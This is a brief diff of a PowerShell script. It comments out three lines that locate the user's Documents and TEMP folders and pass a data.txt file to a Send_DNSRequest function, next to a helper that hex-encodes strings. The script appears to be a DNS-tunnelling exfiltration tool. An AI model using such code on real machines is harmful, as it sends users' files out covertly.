@@ -102,6 +102,6 @@ function Convert-ToCHexString
     [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
     return $ans;
 }
-$mydoc = [environment]::getfolderpath(“mydocuments”)
-$temp = $env:TEMP
-Send_DNSRequest $mydoc'/data.txt'
+#$mydoc = [environment]::getfolderpath(“mydocuments”)
+#$temp = $env:TEMP
+#Send_DNSRequest $mydoc'/data.txt'
